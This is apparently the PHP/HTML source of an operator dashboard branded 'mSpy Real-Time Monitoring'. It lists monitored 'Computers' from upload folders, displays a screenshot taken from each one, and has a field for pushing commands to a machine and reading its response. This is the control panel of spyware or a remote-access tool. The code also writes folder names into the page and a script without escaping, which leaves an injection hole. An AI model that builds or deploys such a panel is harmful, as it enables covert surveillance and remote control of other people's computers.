<?php
// PHP code to scan the "uploads/" directory and get the subdirectories
$uploads_dir = "uploads/";
$directories = [];

if ($handle = opendir($uploads_dir)) {
    while (($entry = readdir($handle)) !== false) {
        $path = $uploads_dir . $entry;
        // Check if it's a directory and not "." or ".."
        if (is_dir($path) && $entry != "." && $entry != "..") {
            $directories[] = $entry;
        }
    }
    closedir($handle);
}

// Set the first directory by default if available
$defaultDir = isset($directories[0]) ? $directories[0] : '';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real-Time Monitoring mSpy</title>
    <link rel="stylesheet" type="text/css" href="Style/app.css?t=15"/>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
    <script>
        let currentDir = '<?php echo $defaultDir; ?>';
    </script>
    <h1>
        <div class="logo">
            <span class="m">m</span>Spy
            <span class="underline"></span>
        </div>
        Real-Time Monitoring
    </h1>

    <div class="container">
        <!-- Left Sidebar for Folder List -->
        <div id="directory-list">
            <h3>Computers :</h3>
            <?php foreach ($directories as $dir): ?>
                <a href="javascript:void(0);" onclick="changeImage('<?php echo $dir; ?>')"><?php echo $dir; ?></a>
            <?php endforeach; ?>
        </div>

        <!-- Image Container for Displaying Screenshot -->
        <div id="image-container">
            <img id="screenshot" src="uploads/<?php echo $defaultDir; ?>/ScreenShot.jpg" alt="Screenshot">
            <div class="command-container">
                <input type="text" id="RequestCommand" placeholder="Enter Command">
                <button id="PushCommand">Push</button>
                <textarea id="RespondCommand" placeholder="Response..." readonly ></textarea> 
            </div>                       
        </div>
        
    </div>
    
    <script type="text/javascript" src="Script/app.js?t=34"></script>
</body>
</html>
